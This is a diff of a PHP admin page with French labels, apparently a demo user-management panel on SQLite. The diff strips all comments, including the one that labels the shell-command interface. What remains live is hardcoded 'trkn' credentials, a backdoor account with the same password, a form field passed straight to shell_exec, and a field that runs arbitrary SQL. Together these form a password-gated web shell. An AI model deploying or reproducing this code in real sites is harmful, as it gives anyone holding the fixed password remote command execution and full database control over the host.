@@ -1,16 +1,11 @@
 <?php
-// Informations de connexion
+
 $login = 'trkn';
-$password = 'trkn'; // Utilise un mot de passe sécurisé
-
-// Utiliser SQLite pour la base de données
-$db_path = 'demo_database.db';  // Nom de la base de données SQLite
-
-// Connexion à la base de données SQLite
+$password = 'trkn';
+$db_path = 'demo_database.db';
 $pdo = new PDO("sqlite:$db_path");
 $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
-// Protection par mot de passe
 session_start();
 if (!isset($_SESSION['logged_in'])) {
     if (isset($_POST['login']) && isset($_POST['password'])) {
@@ -21,7 +16,6 @@ if (!isset($_SESSION['logged_in'])) {
         }
     }
     if (!isset($_SESSION['logged_in'])) {
-        // Afficher le formulaire de connexion
         echo '<!DOCTYPE html>
         <html lang="fr">
         <head>
@@ -71,21 +65,16 @@ if (!isset($_SESSION['logged_in'])) {
     }
 }
 
-// Ajouter un nouvel utilisateur
 if (isset($_POST['add_user'])) {
     $new_user = 'trkn';
-    $new_password = 'trkn'; // à chiffrer pour plus de sécurité
-
-    // Créer une table users si elle n'existe pas déjà
+    $new_password = 'trkn';
     $pdo->exec("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT UNIQUE, password TEXT)");
 
-    // Vérifier si l'utilisateur existe déjà
     $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
     $stmt->execute(['username' => $new_user]);
     $user_exists = $stmt->fetch();
 
     if (!$user_exists) {
-        // Ajouter un utilisateur
         $hashed_password = password_hash($new_password, PASSWORD_DEFAULT);
         $stmt = $pdo->prepare("INSERT INTO users (username, password) VALUES (:username, :password)");
         $stmt->execute(['username' => $new_user, 'password' => $hashed_password]);
@@ -95,7 +84,6 @@ if (isset($_POST['add_user'])) {
     }
 }
 
-// Modifier un utilisateur
 if (isset($_POST['modify_user'])) {
     $user_id = $_POST['user_id'];
     $new_password = $_POST['new_password'];
@@ -110,7 +98,6 @@ if (isset($_POST['modify_user'])) {
     }
 }
 
-// Supprimer un utilisateur
 if (isset($_POST['delete_user'])) {
     $user_id = $_POST['user_id'];
     $stmt = $pdo->prepare("DELETE FROM users WHERE id = :id");
@@ -118,7 +105,6 @@ if (isset($_POST['delete_user'])) {
     echo "<div class='success'>Utilisateur supprimé avec succès.</div>";
 }
 
-// Gérer les utilisateurs existants
 if (isset($_POST['manage_user'])) {
     $stmt = $pdo->query("SELECT * FROM users");
     echo "<h3>Liste des utilisateurs :</h3><table border='1'><tr><th>ID</th><th>Nom d'utilisateur</th><th>Actions</th></tr>";
@@ -142,17 +128,14 @@ if (isset($_POST['manage_user'])) {
     echo "</table>";
 }
 
-// Interface pour exécuter des commandes shell
 if (isset($_POST['cmd'])) {
     $cmd = $_POST['cmd'];
     echo "<h3>Résultat de la commande :</h3><pre>" . shell_exec($cmd) . "</pre>";
 }
 
-// Interface pour exécuter des requêtes SQL
 if (isset($_POST['sql'])) {
     $sql = $_POST['sql'];
 
-    // Si la requête SQL est vide, on exécute la requête par défaut
     if (empty($sql)) {
         $sql = "SELECT * FROM users;";
     }
